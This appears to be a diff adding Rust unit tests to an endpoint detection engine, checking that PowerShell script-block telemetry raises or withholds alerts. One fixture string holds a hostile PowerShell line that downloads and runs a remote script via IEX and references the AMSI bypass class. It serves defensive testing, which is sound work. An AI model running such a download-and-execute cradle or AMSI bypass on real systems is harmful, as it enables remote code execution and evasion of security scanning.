@@ -883,6 +883,79 @@ mod tests {
         )
     }
 
+    /// A PowerShell script block, as the sensor builds one from a 4104.
+    fn script_block(pid: u32, text: &str) -> TelemetryEvent {
+        TelemetryEvent::new(
+            EventId::new(2),
+            HostId::new("host-a").unwrap(),
+            chrono::Utc::now(),
+            EventSource::WindowsEtw,
+            model::ProviderId::new("Microsoft-Windows-PowerShell"),
+            4104,
+            pid,
+            pid,
+            4,
+            EventKind::ScriptBlock(model::ScriptBlock {
+                pid: ProcessId::new(pid),
+                text: text.into(),
+                script_block_id: Some("{block}".into()),
+                path: None,
+                message_number: Some(1),
+                message_total: Some(1),
+                recorded_at: chrono::Utc::now(),
+            }),
+            Payload::empty(),
+        )
+    }
+
+    #[test]
+    fn a_script_block_loader_crosses_the_threshold_and_raises_an_alert() {
+        // End to end over the path a live host can actually take: a 4104 becomes a
+        // wire event, the rules score what it was asked to run, the threshold
+        // decides, governance governs, and a row comes out. Nothing here depends
+        // on a command line that the process provider does not carry.
+        let mut e = engine();
+        let alert = e
+            .ingest(&script_block(
+                100,
+                "IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/a.ps1'); \
+                 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');",
+            ))
+            .expect("alerts");
+
+        assert_eq!(e.metrics().alerts, 1);
+        assert!(!alert.mitre_techniques.is_empty());
+        assert!(
+            alert.description.contains("script block"),
+            "{}",
+            alert.description
+        );
+        // Three independent tells in one block is not a close call, so the rung
+        // is the top one and the alert says what it is waiting for.
+        assert!(
+            alert.description.contains("isolate"),
+            "a full loader should reach the top of the ladder: {}",
+            alert.description
+        );
+    }
+
+    #[test]
+    fn a_quiet_script_block_does_not_move_the_needle() {
+        // The other half of the contract: enabling a provider does not mean
+        // alerting on it. An admin script is counted and held.
+        let mut e = engine();
+        assert!(
+            e.ingest(&script_block(
+                100,
+                "Get-Service | Where-Object Status -eq 'Stopped' | Start-Service"
+            ))
+            .is_none()
+        );
+        assert_eq!(e.metrics().alerts, 0);
+        // And it was seen: a quiet host is not a blind one.
+        assert_eq!(e.metrics().events, 1);
+    }
+
     #[test]
     fn repeat_firings_coalesce_into_one_alert_with_a_count() {
         // The same campaign repeated on one host is one fact about that host.
